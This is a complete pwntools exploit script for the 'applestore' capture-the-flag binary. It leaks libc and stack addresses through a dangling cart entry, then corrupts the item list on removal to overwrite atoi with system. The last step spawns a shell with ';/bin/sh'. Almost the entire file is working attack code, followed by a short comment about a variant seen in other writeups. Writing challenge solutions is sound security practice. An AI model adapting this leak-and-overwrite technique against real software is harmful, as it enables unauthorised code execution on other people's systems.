#!/usr/bin/env python

from pwn import *
import re

r = process('./applestore')

def add(choice):
    r.recvuntil('> ')
    r.sendline('2')
    r.recvuntil('> ')
    r.sendline(choice)

def remove(choice):
    r.recvuntil('> ')
    r.sendline('3')
    r.recvuntil('> ')
    r.sendline(choice)

def list_cart(yes):
    r.recvuntil('> ')
    r.sendline('4')
    r.recvuntil('> ')
    r.sendline(yes)
    
def checkout(yes):
    r.recvuntil('> ')
    r.sendline('5')
    r.recvuntil('> ')
    r.sendline(yes)
    

for _ in xrange(9):
    add('1')
for _ in xrange(15):
    add('2')
add('3')
add('4')

checkout('y')

def leak(addr):
    list_cart('y' + '\x00' + p32(addr) + p32(0) + p32(0) + p32(0))

    r.recvuntil('399\n')
    data = r.recvuntil('- $')
    m = re.match(r'.*27: (....).* - ', data, re.DOTALL)

    assert m != None

    value = u32(m.group(1))
    return value

l = ELF('./libc')
# leak libc
libc = leak(0x0804b040) - l.symbols['atoi'] 
# leak stack
stack = leak(libc + l.symbols['environ'])

print hex(libc)
print "stack: %08x" % stack
pause()
remove('27' + p32(0) + p32(0) + p32(stack - 0x104 - 0xc) + p32(0x0804b040 + 0x22))

r.sendline(p32(libc + l.symbols['system']) + ';/bin/sh\x00')
r.interactive()

#hmm, when i check others' writeups i found them overwrite the ebp to addr before atoi,
#so that we can read(fd,atoi,size)
#awesome
